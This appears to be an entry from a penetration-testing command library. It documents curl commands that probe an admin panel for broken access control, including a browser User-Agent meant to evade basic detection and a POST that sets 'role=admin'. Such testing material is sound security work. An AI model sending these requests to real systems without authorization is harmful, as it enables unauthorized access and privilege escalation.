---
id: cmd-uuid-002
data: 'curl -X GET "https://target.ibm-app.com/admin" -H "User-Agent: Mozilla/5.0" -v'
tags:
  - access-control
  - bypass
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:18.668Z'
verified: false
validated: true
submitted: true
---
# curl-admin-bypass

## Command

```bash
curl -X GET "https://target.ibm-app.com/admin" -H "User-Agent: Mozilla/5.0" -v
```

## Description

This command attempts direct access to an admin panel endpoint to test for broken access controls, bypassing authentication requirements.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | HTTP method for the request | Yes |
| `-H "User-Agent: ..."` | Mimics a browser to avoid basic detection | No |
| `-v` | Verbose mode for detailed response | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://target.ibm-app.com/admin" -v
```

### Advanced Usage

```bash
curl -X POST "https://target.ibm-app.com/admin/action" -d "role=admin" -v
```

## Expected Output

If successful, returns 200 OK with admin page content; failure shows 403 or redirect to login.

## Related

- [[Related Procedure: Bypass-Access-Control-in-Admin-Panel]]
